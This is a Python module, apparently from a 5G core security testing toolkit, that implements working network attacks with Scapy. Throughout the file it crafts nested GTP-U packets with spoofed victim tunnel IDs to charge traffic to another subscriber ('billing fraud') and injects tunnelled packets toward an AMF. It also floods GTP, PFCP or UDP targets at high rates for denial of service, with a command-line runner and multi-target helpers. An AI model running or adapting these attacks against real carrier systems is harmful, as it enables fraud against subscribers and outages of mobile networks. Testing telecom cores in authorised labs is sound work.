#!/usr/bin/env python3
from __future__ import annotations
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
import asyncio
import logging
import time
from typing import List, Dict, Optional, Any, TYPE_CHECKING
from dataclasses import dataclass, field
from core.async_utils import (
    run_in_executor, AsyncRateLimiter, run_async, gather_with_concurrency
)
from core.config import TEST_CONFIG, validate_config
from core.response_verifier import ResponseVerifier
from core.results_db import ResultsDatabase
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
from rich.console import Console

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

if TYPE_CHECKING:
    from scapy.layers.inet import IP, UDP
    from scapy.packet import Raw
    from scapy.sendrecv import send, sr1, sniff
    from scapy.config import conf
    from scapy.contrib.gtp import GTPHeader

try:
    from scapy.layers.inet import IP, UDP
    from scapy.packet import Raw
    from scapy.sendrecv import send, sr1, sniff
    from scapy.config import conf
    from scapy.contrib.gtp import GTPHeader
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy not available")

@dataclass
class AttackResult:
    packet_num: int
    success: bool
    verified: bool = False
    response_time: float = 0.0
    details: Dict[str, Any] = field(default_factory=dict)

@dataclass
class AttackStats:
    total: int = 0
    sent: int = 0
    verified: int = 0
    failed: int = 0
    start_time: float = field(default_factory=time.time)
    bytes_sent: int = 0
    
    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time
    
    @property
    def rate(self) -> float:
        if self.elapsed > 0:
            return self.sent / self.elapsed
        return 0.0
    
    @property
    def bandwidth(self) -> float:
        if self.elapsed > 0:
            return self.bytes_sent / self.elapsed / 1024
        return 0.0

class AsyncBillingFraud:
    def __init__(
        self,
        upf_ip: str,
        outer_teid: int,
        victim_ip: str,
        victim_teid: int,
        iface: Optional[str] = None,
        junk_size: int = 60000,
        concurrency: int = 50,
        rate_limit: float = 100.0,
        verify_responses: bool = True
    ):
        self.upf_ip = upf_ip
        self.outer_teid = outer_teid
        self.victim_ip = victim_ip
        self.victim_teid = victim_teid
        self.iface = iface or TEST_CONFIG.get("interface")
        self.junk_size = junk_size
        self.concurrency = concurrency
        self.rate_limiter = AsyncRateLimiter(rate=rate_limit, burst=20)
        self.verify_responses = verify_responses
        self.verifier = ResponseVerifier(timeout=2.0)
        self.stats = AttackStats()
        self._semaphore = asyncio.Semaphore(concurrency)
        self._results: List[AttackResult] = []
        self._cancel_event = asyncio.Event()
    
    def _craft_packet(self) -> Optional[Any]:
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            junk = b'\x00' * self.junk_size
            inner_pkt = IP(
                src=TEST_CONFIG.get("inner_src", "10.45.0.1"),
                dst=self.victim_ip
            ) / UDP() / Raw(load=junk)
            
            inner_gtpu = GTPHeader(teid=self.victim_teid, gtp_type=255) / inner_pkt
            
            outer_packet = (
                IP(src=TEST_CONFIG.get("outer_src", "10.0.0.1"), dst=self.upf_ip) /
                UDP(sport=2152, dport=2152) /
                GTPHeader(teid=self.outer_teid, gtp_type=255) /
                inner_gtpu
            )
            
            return outer_packet
        except Exception as e:
            logger.error(f"Failed to craft packet: {e}")
            return None
    
    def _send_packet_sync(self, packet_num: int) -> AttackResult:
        start = time.time()
        result = AttackResult(packet_num=packet_num, success=False)
        
        try:
            pkt = self._craft_packet()
            if pkt is None:
                result.details["error"] = "Failed to craft packet"
                return result
            
            send(pkt, iface=self.iface, verbose=0)
            result.success = True
            self.stats.bytes_sent += len(pkt)
            
            if self.verify_responses:
                try:
                    resp = sr1(pkt, timeout=0.5, verbose=0)
                    if resp:
                        verification = self.verifier.verify_gtp_response(
                            resp, expected_teid=self.outer_teid
                        )
                        if verification.get("success"):
                            result.verified = True
                            result.details["verification"] = verification
                except Exception as e:
                    result.details["verify_error"] = str(e)
            
            result.response_time = time.time() - start
            
        except Exception as e:
            result.details["error"] = str(e)
        
        return result
    
    async def send_packet(self, packet_num: int) -> AttackResult:
        if self._cancel_event.is_set():
            return AttackResult(packet_num=packet_num, success=False)
        
        await self.rate_limiter.acquire()
        async with self._semaphore:
            try:
                result = await asyncio.wait_for(
                    run_in_executor(self._send_packet_sync, packet_num),
                    timeout=5.0
                )
                
                if result.success:
                    self.stats.sent += 1
                    if result.verified:
                        self.stats.verified += 1
                else:
                    self.stats.failed += 1
                
                self.stats.total += 1
                self._results.append(result)
                return result
                
            except asyncio.TimeoutError:
                self.stats.failed += 1
                self.stats.total += 1
                return AttackResult(packet_num=packet_num, success=False, details={"error": "timeout"})
            except Exception as e:
                self.stats.failed += 1
                self.stats.total += 1
                return AttackResult(packet_num=packet_num, success=False, details={"error": str(e)})
    
    async def execute(
        self,
        count: int,
        show_progress: bool = True
    ) -> Dict[str, Any]:
        validate_config()
        self.stats = AttackStats()
        self._results = []
        self._cancel_event.clear()
        
        logger.info(f"Async Billing Fraud Attack: {count} packets to {self.upf_ip}")
        logger.info(f"Target: TEID {self.outer_teid} -> Victim {self.victim_ip}:{self.victim_teid}")
        logger.info(f"Concurrency: {self.concurrency}, Rate limit: {self.rate_limiter.rate}/s")
        
        console = Console() if show_progress else None
        
        try:
            if show_progress and console:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TextColumn("Sent: {task.fields[sent]} | Verified: {task.fields[verified]} | {task.fields[rate]} pkt/s"),
                    TimeRemainingColumn(),
                    console=console
                ) as progress:
                    task = progress.add_task(
                        "[red]Billing Fraud Attack (Async)",
                        total=count,
                        sent=0,
                        verified=0,
                        rate="0"
                    )
                    
                    batch_size = min(100, count)
                    completed = 0
                    
                    for i in range(0, count, batch_size):
                        if self._cancel_event.is_set():
                            break
                        
                        batch = list(range(i, min(i + batch_size, count)))
                        tasks = [self.send_packet(n) for n in batch]
                        await asyncio.gather(*tasks, return_exceptions=True)
                        
                        completed += len(batch)
                        progress.update(
                            task,
                            completed=completed,
                            sent=self.stats.sent,
                            verified=self.stats.verified,
                            rate=f"{self.stats.rate:.1f}"
                        )
            else:
                tasks = [self.send_packet(n) for n in range(count)]
                await asyncio.gather(*tasks, return_exceptions=True)
            
            logger.info(f"Attack complete: {self.stats.sent}/{count} sent, {self.stats.verified} verified")
            logger.info(f"Rate: {self.stats.rate:.1f} pkt/s, Bandwidth: {self.stats.bandwidth:.1f} KB/s")
            
            result = {
                "packets_sent": self.stats.sent,
                "packets_verified": self.stats.verified,
                "packets_failed": self.stats.failed,
                "total_packets": count,
                "rate": self.stats.rate,
                "bandwidth_kbps": self.stats.bandwidth,
                "elapsed": self.stats.elapsed
            }
            
            try:
                db = ResultsDatabase()
                db.save_attack_result(
                    attack_type="billing_fraud_async",
                    target_ip=self.upf_ip,
                    success=self.stats.sent > 0,
                    packets_sent=self.stats.sent,
                    responses_received=self.stats.verified,
                    duration=int(self.stats.elapsed)
                )
            except Exception as e:
                logger.debug(f"Failed to save result to DB: {e}")
            
            return result
            
        except KeyboardInterrupt:
            self._cancel_event.set()
            logger.warning("Attack interrupted")
            return {
                "packets_sent": self.stats.sent,
                "packets_verified": self.stats.verified,
                "interrupted": True
            }
        except Exception as e:
            logger.error(f"Attack failed: {e}", exc_info=True)
            return {"packets_sent": self.stats.sent, "error": str(e)}
    
    def cancel(self):
        self._cancel_event.set()

class AsyncNestedTunnel:
    def __init__(
        self,
        upf_ip: str,
        outer_teid: int,
        amf_ip: str,
        inner_teid: int,
        iface: Optional[str] = None,
        concurrency: int = 30,
        rate_limit: float = 50.0
    ):
        self.upf_ip = upf_ip
        self.outer_teid = outer_teid
        self.amf_ip = amf_ip
        self.inner_teid = inner_teid
        self.iface = iface or TEST_CONFIG.get("interface")
        self.concurrency = concurrency
        self.rate_limiter = AsyncRateLimiter(rate=rate_limit, burst=10)
        self.verifier = ResponseVerifier(timeout=3.0)
        self.stats = AttackStats()
        self._semaphore = asyncio.Semaphore(concurrency)
        self._cancel_event = asyncio.Event()
    
    def _craft_nested_packet(self, test_payload: bytes) -> Optional[Any]:
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            inner_gtpu = (
                GTPHeader(teid=self.inner_teid, gtp_type=255) /
                IP(src="10.45.0.1", dst=self.amf_ip) /
                UDP(sport=2152, dport=38412) /
                Raw(load=test_payload)
            )
            
            outer_packet = (
                IP(dst=self.upf_ip) /
                UDP(sport=2152, dport=2152) /
                GTPHeader(teid=self.outer_teid, gtp_type=255) /
                Raw(load=bytes(inner_gtpu))
            )
            
            return outer_packet
        except Exception as e:
            logger.error(f"Failed to craft nested packet: {e}")
            return None
    
    def _send_nested_sync(self, packet_num: int, payload: bytes) -> AttackResult:
        start = time.time()
        result = AttackResult(packet_num=packet_num, success=False)
        
        try:
            pkt = self._craft_nested_packet(payload)
            if pkt is None:
                result.details["error"] = "Failed to craft packet"
                return result
            
            resp = sr1(pkt, iface=self.iface, timeout=2.0, verbose=0)
            result.response_time = time.time() - start
            
            if resp:
                result.success = True
                verification = self.verifier.verify_gtp_response(resp)
                if verification.get("success"):
                    result.verified = True
                    result.details["response"] = verification
            else:
                result.success = True
                result.details["no_response"] = True
            
        except Exception as e:
            result.details["error"] = str(e)
        
        return result
    
    async def send_nested(self, packet_num: int, payload: bytes) -> AttackResult:
        if self._cancel_event.is_set():
            return AttackResult(packet_num=packet_num, success=False)
        
        await self.rate_limiter.acquire()
        async with self._semaphore:
            try:
                result = await asyncio.wait_for(
                    run_in_executor(self._send_nested_sync, packet_num, payload),
                    timeout=5.0
                )
                
                if result.success:
                    self.stats.sent += 1
                    if result.verified:
                        self.stats.verified += 1
                else:
                    self.stats.failed += 1
                
                self.stats.total += 1
                return result
                
            except Exception as e:
                self.stats.failed += 1
                self.stats.total += 1
                return AttackResult(packet_num=packet_num, success=False, details={"error": str(e)})
    
    async def execute(
        self,
        count: int,
        show_progress: bool = True
    ) -> Dict[str, Any]:
        validate_config()
        self.stats = AttackStats()
        self._cancel_event.clear()
        
        logger.info(f"Async Nested Tunnel Attack: {count} packets")
        logger.info(f"Outer: {self.upf_ip}:{self.outer_teid} -> Inner: {self.amf_ip}:{self.inner_teid}")
        
        test_payloads = [
            b"\x00\x11\x00\x00" + b"\x00" * 100,
            b"\x00\x15\x00\x00" + bytes([i % 256 for i in range(100)]),
            b"\x00\x0e\x00\x00" + b"\xff" * 100,
        ]
        
        console = Console() if show_progress else None
        
        try:
            if show_progress and console:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TextColumn("Sent: {task.fields[sent]} | Responses: {task.fields[verified]}"),
                    TimeRemainingColumn(),
                    console=console
                ) as progress:
                    task = progress.add_task(
                        "[magenta]Nested Tunnel Attack (Async)",
                        total=count,
                        sent=0,
                        verified=0
                    )
                    
                    for i in range(count):
                        if self._cancel_event.is_set():
                            break
                        
                        payload = test_payloads[i % len(test_payloads)]
                        await self.send_nested(i, payload)
                        
                        progress.update(
                            task,
                            completed=i + 1,
                            sent=self.stats.sent,
                            verified=self.stats.verified
                        )
            else:
                tasks = []
                for i in range(count):
                    payload = test_payloads[i % len(test_payloads)]
                    tasks.append(self.send_nested(i, payload))
                await asyncio.gather(*tasks, return_exceptions=True)
            
            logger.info(f"Nested tunnel complete: {self.stats.sent}/{count} sent, {self.stats.verified} responses")
            
            return {
                "packets_sent": self.stats.sent,
                "responses_received": self.stats.verified,
                "total_packets": count,
                "rate": self.stats.rate,
                "elapsed": self.stats.elapsed
            }
            
        except KeyboardInterrupt:
            self._cancel_event.set()
            logger.warning("Attack interrupted")
            return {"packets_sent": self.stats.sent, "interrupted": True}
        except Exception as e:
            logger.error(f"Attack failed: {e}", exc_info=True)
            return {"packets_sent": self.stats.sent, "error": str(e)}
    
    def cancel(self):
        self._cancel_event.set()

class AsyncDoS:
    def __init__(
        self,
        target_ip: str,
        target_port: int,
        protocol: str = "gtp",
        iface: Optional[str] = None,
        concurrency: int = 100,
        rate_limit: float = 1000.0
    ):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.iface = iface or TEST_CONFIG.get("interface")
        self.concurrency = concurrency
        self.rate_limiter = AsyncRateLimiter(rate=rate_limit, burst=200)
        self.stats = AttackStats()
        self._semaphore = asyncio.Semaphore(concurrency)
        self._cancel_event = asyncio.Event()
    
    def _craft_dos_packet(self) -> Optional[Any]:
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            if self.protocol == "gtp":
                return (
                    IP(dst=self.target_ip) /
                    UDP(dport=self.target_port) /
                    GTPHeader(teid=0, gtp_type=1) /
                    Raw(load=b"\x00" * 100)
                )
            elif self.protocol == "pfcp":
                return (
                    IP(dst=self.target_ip) /
                    UDP(dport=self.target_port) /
                    Raw(load=b"\x20\x01" + b"\x00" * 12)
                )
            else:
                return (
                    IP(dst=self.target_ip) /
                    UDP(dport=self.target_port) /
                    Raw(load=b"\x00" * 100)
                )
        except Exception as e:
            logger.error(f"Failed to craft DoS packet: {e}")
            return None
    
    def _send_dos_sync(self) -> bool:
        try:
            pkt = self._craft_dos_packet()
            if pkt:
                send(pkt, iface=self.iface, verbose=0)
                return True
        except:
            pass
        return False
    
    async def send_packet(self) -> bool:
        if self._cancel_event.is_set():
            return False
        
        await self.rate_limiter.acquire()
        async with self._semaphore:
            try:
                success = await run_in_executor(self._send_dos_sync)
                if success:
                    self.stats.sent += 1
                else:
                    self.stats.failed += 1
                self.stats.total += 1
                return success
            except:
                self.stats.failed += 1
                self.stats.total += 1
                return False
    
    async def execute(
        self,
        count: int,
        duration: Optional[float] = None,
        show_progress: bool = True
    ) -> Dict[str, Any]:
        self.stats = AttackStats()
        self._cancel_event.clear()
        
        logger.info(f"Async DoS Attack: {self.target_ip}:{self.target_port} ({self.protocol})")
        
        console = Console() if show_progress else None
        
        try:
            if duration:
                end_time = time.time() + duration
                logger.info(f"Running for {duration}s...")
                
                while time.time() < end_time and not self._cancel_event.is_set():
                    batch_tasks = [self.send_packet() for _ in range(min(100, self.concurrency))]
                    await asyncio.gather(*batch_tasks, return_exceptions=True)
            else:
                if show_progress and console:
                    with Progress(
                        SpinnerColumn(),
                        TextColumn("[progress.description]{task.description}"),
                        BarColumn(),
                        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                        TextColumn("{task.fields[rate]} pkt/s"),
                        TimeRemainingColumn(),
                        console=console
                    ) as progress:
                        task = progress.add_task(
                            "[red]DoS Attack (Async)",
                            total=count,
                            rate="0"
                        )
                        
                        batch_size = min(500, count)
                        completed = 0
                        
                        for i in range(0, count, batch_size):
                            if self._cancel_event.is_set():
                                break
                            
                            batch = [self.send_packet() for _ in range(min(batch_size, count - i))]
                            await asyncio.gather(*batch, return_exceptions=True)
                            
                            completed += len(batch)
                            progress.update(
                                task,
                                completed=completed,
                                rate=f"{self.stats.rate:.0f}"
                            )
                else:
                    tasks = [self.send_packet() for _ in range(count)]
                    await asyncio.gather(*tasks, return_exceptions=True)
            
            logger.info(f"DoS complete: {self.stats.sent} packets, {self.stats.rate:.0f} pkt/s")
            
            return {
                "packets_sent": self.stats.sent,
                "packets_failed": self.stats.failed,
                "rate": self.stats.rate,
                "elapsed": self.stats.elapsed
            }
            
        except KeyboardInterrupt:
            self._cancel_event.set()
            logger.warning("DoS interrupted")
            return {"packets_sent": self.stats.sent, "interrupted": True}
        except Exception as e:
            logger.error(f"DoS failed: {e}")
            return {"packets_sent": self.stats.sent, "error": str(e)}
    
    def cancel(self):
        self._cancel_event.set()

async def billing_fraud_async(
    upf_ip: str,
    outer_teid: int,
    victim_ip: str,
    victim_teid: int,
    count: int = 100,
    **kwargs
) -> Dict[str, Any]:
    attack = AsyncBillingFraud(upf_ip, outer_teid, victim_ip, victim_teid, **kwargs)
    return await attack.execute(count)

async def nested_tunnel_async(
    upf_ip: str,
    outer_teid: int,
    amf_ip: str,
    inner_teid: int,
    count: int = 50,
    **kwargs
) -> Dict[str, Any]:
    attack = AsyncNestedTunnel(upf_ip, outer_teid, amf_ip, inner_teid, **kwargs)
    return await attack.execute(count)

async def dos_async(
    target_ip: str,
    target_port: int,
    count: int = 1000,
    **kwargs
) -> Dict[str, Any]:
    attack = AsyncDoS(target_ip, target_port, **kwargs)
    return await attack.execute(count)

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Async 5G Attack Module")
    parser.add_argument("attack", choices=["billing", "nested", "dos"])
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port", "-p", type=int, default=2152)
    parser.add_argument("--teid", type=int, default=1)
    parser.add_argument("--victim", default="10.45.0.100")
    parser.add_argument("--vteid", type=int, default=100)
    parser.add_argument("--count", "-c", type=int, default=100)
    parser.add_argument("--concurrency", type=int, default=50)
    parser.add_argument("--rate", "-r", type=float, default=100.0)
    
    args = parser.parse_args()
    
    async def main():
        if args.attack == "billing":
            result = await billing_fraud_async(
                args.target, args.teid, args.victim, args.vteid,
                count=args.count, concurrency=args.concurrency, rate_limit=args.rate
            )
        elif args.attack == "nested":
            result = await nested_tunnel_async(
                args.target, args.teid, args.victim, args.vteid,
                count=args.count, concurrency=args.concurrency, rate_limit=args.rate
            )
        else:
            result = await dos_async(
                args.target, args.port,
                count=args.count, concurrency=args.concurrency, rate_limit=args.rate
            )
        
        print(f"\nResult: {result}")
    
    asyncio.run(main())


def run_billing_fraud_sync(upf_ip: str, outer_teid: int, 
                           victim_ip: str, victim_teid: int, **kwargs) -> dict:
    conf.verb = 0
    return run_async(billing_fraud_async(upf_ip, outer_teid, victim_ip, victim_teid, **kwargs))


def run_dos_sync(target_ip: str, target_port: int, **kwargs) -> dict:
    conf.verb = 0
    return run_async(dos_async(target_ip, target_port, **kwargs))


async def multi_target_attack(targets: List[tuple], attack_func, **kwargs) -> List[dict]:
    conf.verb = 0
    tasks = [attack_func(t[0], t[1], **kwargs) for t in targets]
    return await gather_with_concurrency(5, *tasks)


async def passive_capture_during_attack(iface: str, attack_coro, filter_str: str = "udp port 2152",
                                        timeout: int = 30) -> tuple:
    captured_packets = []
    
    def packet_handler(pkt):
        captured_packets.append(pkt)
    
    loop = asyncio.get_event_loop()
    sniff_task = loop.run_in_executor(
        None, 
        lambda: sniff(iface=iface, filter=filter_str, prn=packet_handler, timeout=timeout, store=0)
    )
    
    attack_result = await attack_coro
    await sniff_task
    
    return attack_result, captured_packets

